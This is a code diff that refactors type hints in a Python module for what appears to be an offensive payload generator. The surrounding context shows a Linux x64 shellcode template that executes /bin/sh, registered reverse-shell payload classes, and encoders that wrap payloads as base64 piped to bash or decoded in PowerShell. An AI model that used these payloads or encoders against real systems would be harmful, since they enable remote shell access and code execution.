@@ -12,15 +12,11 @@ Payloads are registered as ``PayloadTemplate`` instances with metadata
 from __future__ import annotations
 
 import base64
-import binascii
+import builtins
 import os
-import socket
-import struct
 import subprocess
-import tempfile
 from abc import ABC, abstractmethod
-from typing import Any, Callable, Dict, List, Optional, Tuple
-
+from typing import Any
 
 OUTPUT_FORMATS = {
     "py": ".py",
@@ -48,7 +44,7 @@ OUTPUT_FORMATS = {
     "macro": ".bas",
 }
 
-SHELLCODE_TEMPLATES: Dict[str, str] = {
+SHELLCODE_TEMPLATES: dict[str, str] = {
     "linux/x64/exec": (
         "\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e"
         "\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x31"
@@ -121,7 +117,7 @@ class PayloadTemplate(ABC):
         platform: str,
         arch: str,
         description: str,
-        options: Dict[str, Any] | None = None,
+        options: dict[str, Any] | None = None,
     ) -> None:
         self.name = name
         self.platform = platform
@@ -134,7 +130,7 @@ class PayloadTemplate(ABC):
         """Generate the raw payload bytes."""
         ...
 
-    def to_dict(self) -> Dict[str, Any]:
+    def to_dict(self) -> dict[str, Any]:
         return {
             "name": self.name,
             "platform": self.platform,
@@ -260,11 +256,11 @@ class PayloadFactory:
     """
 
     def __init__(self) -> None:
-        self._templates: Dict[str, PayloadTemplate] = {}
+        self._templates: dict[str, PayloadTemplate] = {}
         self._register_builtins()
 
     def _register_builtins(self) -> None:
-        builtins: List[PayloadTemplate] = [
+        builtins: list[PayloadTemplate] = [
             ReverseShellPayload(),
             WindowsReverseShellPayload(),
         ]
@@ -275,7 +271,7 @@ class PayloadFactory:
         """Register a custom payload template."""
         self._templates[template.name] = template
 
-    def list(self, platform: str | None = None) -> List[Dict[str, Any]]:
+    def list(self, platform: str | None = None) -> builtins.list[dict[str, Any]]:
         """List all registered payloads, optionally filtered by platform."""
         results = []
         for t in self._templates.values():
@@ -344,22 +340,22 @@ class PayloadFactory:
             return base64.b64encode(data)
         elif fmt == "c":
             as_hex = "".join(f"\\x{b:02x}" for b in data)
-            return f'unsigned char buf[] = "{as_hex}";\n'.encode("utf-8")
+            return f'unsigned char buf[] = "{as_hex}";\n'.encode()
         elif fmt == "python" or fmt == "py":
             as_hex = "".join(f"\\x{b:02x}" for b in data)
-            return f'buf = b"{as_hex}"\n'.encode("utf-8")
+            return f'buf = b"{as_hex}"\n'.encode()
         elif fmt == "powershell" or fmt == "ps1":
             b64 = base64.b64encode(data).decode("utf-8")
             ps_code = f'[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{b64}"))'
             return ps_code.encode("utf-8")
         elif fmt == "bash" or fmt == "sh":
             b64 = base64.b64encode(data).decode("utf-8")
-            return f"echo {b64} | base64 -d | bash\n".encode("utf-8")
+            return f"echo {b64} | base64 -d | bash\n".encode()
         else:
             return data
 
     @staticmethod
-    def list_formats() -> List[Dict[str, str]]:
+    def list_formats() -> builtins.list[dict[str, str]]:
         """List all available output formats."""
         formats = []
         for key, ext in sorted(OUTPUT_FORMATS.items()):
@@ -367,7 +363,7 @@ class PayloadFactory:
         return formats
 
 
-def format_payload_table(payloads: List[Dict[str, Any]]) -> str:
+def format_payload_table(payloads: list[dict[str, Any]]) -> str:
     """Format a list of payload dicts as an aligned table.
 
     Args:
@@ -393,11 +389,11 @@ def format_payload_table(payloads: List[Dict[str, Any]]) -> str:
     widths = [
         max(len(r[i]) for r in rows + [headers]) for i in range(len(headers))
     ]
-    header = "  ".join(h.ljust(w) for h, w in zip(headers, widths))
+    header = "  ".join(h.ljust(w) for h, w in zip(headers, widths, strict=False))
     sep = "  ".join("-" * w for w in widths)
     lines = [header, sep]
     for row in rows:
-        lines.append("  ".join(v.ljust(w) for v, w in zip(row, widths)))
+        lines.append("  ".join(v.ljust(w) for v, w in zip(row, widths, strict=False)))
     return "\n".join(lines)
 
 
